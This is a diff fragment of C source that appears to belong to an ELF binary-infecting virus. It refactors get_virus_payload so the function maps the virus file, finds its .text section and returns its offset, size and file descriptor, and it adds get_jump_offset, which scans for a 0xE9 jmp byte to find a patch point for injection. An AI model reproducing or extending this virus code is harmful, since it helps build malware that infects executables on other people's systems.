@@ -15,7 +15,7 @@
 
 
 
-void get_virus_payload(char* filename, uint8_t** memory, size_t* virus_size, Elf64_Addr* jump_off_t){
+void get_virus_payload(char* filename, int* virus_fd, uint8_t** memory, size_t* virus_size, Elf64_Addr* text_off_t, size_t* virus_file_size){
     int fd = open(filename, O_RDONLY);
     struct stat sb;
 
@@ -23,7 +23,7 @@ void get_virus_payload(char* filename, uint8_t** memory, size_t* virus_size, Elf
 
 
     uint8_t *mem = mmap(NULL, sb.st_size, PROT_READ,  MAP_PRIVATE, fd, 0);
-
+    *virus_file_size = sb.st_size;
     Elf64_Ehdr* ehdr = (Elf64_Ehdr *) mem;
     Elf64_Phdr* phdr = (Elf64_Phdr *) &mem[ehdr->e_phoff];
     Elf64_Shdr* shdr = (Elf64_Shdr *) &mem[ehdr->e_shoff];
@@ -40,10 +40,16 @@ void get_virus_payload(char* filename, uint8_t** memory, size_t* virus_size, Elf
         }
     }
 
-    *memory  = mem + text_section.sh_offset;
+    *memory  = mem;
+    *text_off_t = text_section.sh_offset;
     *virus_size = text_section.sh_size;
-    for(size_t i = 0; i < *virus_size; i++){
-        unsigned char* p = (unsigned char *) mem + i + text_section.sh_offset;
+    *virus_fd = fd;
+}
+
+
+void get_jump_offset(uint8_t* memory, size_t virus_size, Elf64_Addr text_off_t, Elf64_Addr* jump_off_t){
+    for(size_t i = 0; i < virus_size; i++){
+        unsigned char* p = (unsigned char *) memory + i + text_off_t;
         if(*p == (unsigned char)'\xe9'){
             *jump_off_t = i + 5;
             break;
